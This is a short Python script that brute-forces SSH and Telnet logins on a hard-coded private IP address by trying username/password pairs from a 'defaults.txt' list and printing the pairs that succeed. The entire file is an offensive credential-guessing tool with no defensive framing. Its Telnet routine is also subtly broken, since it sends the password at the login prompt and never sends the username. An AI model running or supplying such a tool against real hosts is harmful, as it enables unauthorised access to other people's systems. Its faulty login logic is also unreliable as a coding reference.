import paramiko
import telnetlib

def SSHLogin(host, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        ssh_session = ssh.get_transport().open_session()
        if ssh_session.active:
            print(f"SSH Login successful on Username : {username} with Password : {password}")
    except Exception as e:
        return
    
    ssh.close()

def TelnetLogin(host, port, username, password):
    user = bytes(username + "\n", "utf-8")
    passwd = bytes(password + "\n", "utf-8")

    tn = telnetlib.Telnet(host, port)
    tn.read_until(bytes("login:", "utf-8"))
    tn.write(passwd)
    try:
        result = tn.expect([bytes("Last login", "utf-8")], timeout=2)
        if (result[0] >= 0):
            print(f"Telnet login successful on {host}:{port} with Username: {username} and Password: {password}")
        tn.close()
    except EOFError:
        print(f"Login Failed {username}, {password}")


host = "192.168.0.167"
with open("defaults.txt", "r") as f:
    for line in f:
        vals = line.split(sep=",")
        username = vals[0].strip()
        password = vals[1].strip()
        SSHLogin(host, 22, username, password)
        TelnetLogin(host, 23, username, password)